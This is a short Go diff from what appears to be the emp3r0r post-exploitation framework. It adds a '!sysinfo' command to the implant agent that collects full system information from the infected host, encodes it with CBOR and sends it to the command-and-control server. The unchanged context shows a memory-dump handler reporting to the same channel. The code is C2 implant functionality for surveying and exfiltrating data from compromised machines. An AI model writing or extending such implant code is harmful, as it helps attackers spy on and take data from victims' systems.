@@ -15,6 +15,7 @@ import (
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/ssh"
@@ -422,4 +423,15 @@ func runMemDump(cmd *cobra.Command, args []string) {
 	}
 	defer os.RemoveAll(outPath)
 	c2transport.NotifyC2(cmd, "%s\n", tarball)
+}
+
+// runSysInfo implements !sysinfo
+func runSysInfo(cmd *cobra.Command, args []string) {
+	info := agentutils.CollectFullSystemInfo()
+	data, err := cbor.Marshal(info)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error: %v\n", err)
+		return
+	}
+	c2transport.NotifyC2(cmd, "%s\n", string(data))
 }
